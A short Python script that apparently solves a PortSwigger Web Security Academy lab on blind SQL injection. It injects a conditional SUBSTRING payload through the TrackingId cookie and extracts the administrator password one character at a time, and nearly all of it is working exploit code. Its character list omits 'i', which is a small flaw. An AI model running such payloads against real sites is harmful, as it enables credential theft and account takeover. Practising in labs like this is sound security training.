import requests
import string
#https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-exploiting-blind-sql-injection-by-triggering-conditional-responses/sql-injection/blind/lab-conditional-responses#
url = "https://0ae7001604eb877d81331b8d005b0075.web-security-academy.net/filter?category=Gifts"
admin_password = ''
password_chars = ['a','b','c','d','e','f','g','h','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','1','2','3','4','5','6','7','8','9','0','~','!','@','#','$','%','^','&','*','(',')','+','-','/']
for i in range(1, 21):
    for j in password_chars:
        payload = f"'+OR+(SELECT+SUBSTRING(password,{i},1)+FROM+users+WHERE+username='administrator')='{j}"
        cookies = {"TrackingId": payload}
        response = requests.get(url, cookies=cookies)
        found_char = j
        if "welcome back" in response.text.lower():
            admin_password += found_char
            print(f"{i}, character {j}")
print(admin_password)
